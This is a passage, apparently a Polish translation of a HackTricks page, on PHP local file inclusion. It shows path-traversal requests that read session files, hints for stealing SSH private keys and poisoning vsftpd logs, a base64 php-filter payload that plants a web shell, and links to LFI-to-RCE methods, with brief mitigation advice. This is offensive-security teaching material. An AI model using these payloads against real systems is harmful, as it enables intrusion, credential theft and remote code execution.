Następnie, należy skonstruować odpowiednią ścieżkę do pliku sesji PHP. Może to być ścieżka bezwzględna lub względna, w zależności od implementacji aplikacji. Przykładowe ścieżki mogą wyglądać następująco:

- Ścieżka bezwzględna: `/var/lib/php/sessions/sess_1234567890abcdef`
- Ścieżka względna: `../../../../../var/lib/php/sessions/sess_1234567890abcdef`

Po skonstruowaniu odpowiedniej ścieżki, można ją przekazać do podatnego punktu końcowego, aby wczytać zawartość pliku sesji PHP. W ten sposób można uzyskać dostęp do poufnych informacji przechowywanych w sesji użytkownika.

## Zabezpieczenia

Aby zabezpieczyć się przed atakami LFI, należy:

- Poprawnie walidować i filtrować wszelkie dane wejściowe, które są wykorzystywane do konstrukcji ścieżki pliku.
- Unikać wykorzystywania funkcji do wczytywania plików, które mogą być podatne na ataki LFI.
- Przechowywać pliki sesji w bezpiecznym miejscu, niedostępnym dla użytkowników zewnętrznych.

## Przykłady

### Przykład 1: Włączanie pliku sesji PHP za pomocą LFI

```
GET /vulnerable.php?page=/var/lib/php/sessions/sess_1234567890abcdef HTTP/1.1
Host: example.com
```

W tym przykładzie, atakujący wykorzystuje podatny punkt końcowy `vulnerable.php`, który umożliwia wczytanie plików z lokalnego systemu plików. Atakujący konstruuje ścieżkę do pliku sesji PHP i przekazuje ją jako parametr `page`. W rezultacie, atakujący może uzyskać dostęp do zawartości pliku sesji PHP, w tym poufnych informacji użytkownika.

### Przykład 2: Włączanie pliku sesji PHP za pomocą LFI (ścieżka względna)

```
GET /vulnerable.php?page=../../../../../var/lib/php/sessions/sess_1234567890abcdef HTTP/1.1
Host: example.com
```

W tym przykładzie, atakujący wykorzystuje podatny punkt końcowy `vulnerable.php`, który umożliwia wczytanie plików z lokalnego systemu plików. Atakujący konstruuje ścieżkę względną do pliku sesji PHP i przekazuje ją jako parametr `page`. W rezultacie, atakujący może uzyskać dostęp do zawartości pliku sesji PHP, w tym poufnych informacji użytkownika.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Przez ssh

Jeśli ssh jest aktywne, sprawdź, który użytkownik jest używany (/proc/self/status & /etc/passwd) i spróbuj uzyskać dostęp do **\<HOME>/.ssh/id\_rsa**

### **Przez** **dzienniki** **vsftpd**

Dzienniki serwera FTP vsftpd znajdują się w **_/var/log/vsftpd.log_**. W przypadku istnienia podatności na lokalne włączenie pliku (LFI) i możliwości dostępu do wystawionego serwera vsftpd, można rozważyć następujące kroki:

1. Wstrzyknij ładunek PHP do pola nazwy użytkownika podczas procesu logowania.
2. Po wstrzyknięciu, użyj LFI, aby pobrać dzienniki serwera z **_/var/log/vsftpd.log_**.


### Przez filtr php base64 (używając base64)

Jak pokazano w [tym](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artykule, filtr PHP base64 po prostu ignoruje Nie-base64. Możesz użyć tego do ominięcia sprawdzania rozszerzenia pliku: jeśli dostarczysz base64, który kończy się na ".php", to po prostu zignoruje "." i dołączy "php" do base64. Oto przykładowy ładunek:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Za pomocą filtrów php (nie wymagany plik)

Ten [**opis**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) wyjaśnia, że można użyć **filtrów php do generowania dowolnej zawartości** jako wyniku. Oznacza to, że można **generować dowolny kod php** do dołączenia **bez konieczności zapisywania** go do pliku.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Za pomocą błędu segmentacji

**Prześlij** plik, który zostanie przechowywany jako **tymczasowy** w `/tmp`, a następnie w **tym samym żądaniu** wywołaj **błąd segmentacji**, wtedy **tymczasowy plik nie zostanie usunięty** i można go wyszukać.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Za pomocą tymczasowego przechowywania plików Nginx

Jeśli znaleziono **Lokalne Włączenie Pliku** i **Nginx** działa przed PHP, można uzyskać RCE za pomocą następującej techniki:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Za pomocą PHP\_SESSION\_UPLOAD\_PROGRESS

Jeśli znaleziono **Lokalne Włączenie Pliku**, nawet jeśli **nie ma się sesji** i `session.auto_start` jest ustawione na `Off`. Jeśli podasz **`PHP_SESSION_UPLOAD_PROGRESS`** w danych **multipart POST**, PHP **włączy sesję dla Ciebie**. Można to wykorzystać do uzyskania RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Za pomocą tymczasowego przesyłania plików w systemie Windows

Jeśli znaleziono **Lokalne Włączenie Pliku** i serwer działa w systemie **Windows**, można uzyskać RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Za pomocą phpinfo() (file\_uploads = on)

Jeśli znaleziono **Lokalne Włączenie Pliku** i plik ujawniający **phpinfo()** z file\_uploads = on, można uzyskać RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Za pomocą compress.zlib + `PHP_STREAM_PREFER_STUDIO` + ujawnienie ścieżki

Jeśli znaleziono **Lokalne Włączenie Pliku** i można **wydobyć ścieżkę** do pliku tymczasowego, ALE **serwer sprawdza**, czy **dołączany plik ma znaczniki PHP**, można spróbować **obejść tę kontrolę** za pomocą tej **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Za pomocą wiecznego oczekiwania + brute force

Jeśli można wykorzystać LFI do **przesyłania tymczasowych plików** i spowodować **zawieszenie** wykonania PHP na serwerze, można następnie **przez godziny próbować odgadnąć nazwy plików tymczasowych**, aby je znaleźć:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Do błędu krytycznego

Jeśli dołączysz którykolwiek z plików `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Musisz dołączyć ten sam plik 2 razy, aby spowodować ten błąd).

**Nie wiem, jak to może być przydatne, ale może tak być.**\
_Nawet jeśli spowodujesz błąd krytyczny PHP, tymczasowe pliki przesłane są usuwane._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Odwołania

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Dołącz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hakerami i łowcami błędów!

**Wgląd w Hacking**\
Zajmuj się treściami, które zagłębiają się w emocje i wyzwania związane z hakerstwem

**Aktualności na żywo o Hackingu**\
Bądź na bieżąco z szybkim tempem świata hakerstwa dzięki aktualnym wiadomościom i wglądom

**Najnowsze ogłoszenia**\
Bądź na bieżąco z najnowszymi programami bug bounty i ważnymi aktualizacjami platform

**Dołącz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij współpracować z najlepszymi hakerami już dziś!

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Uzyskaj [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
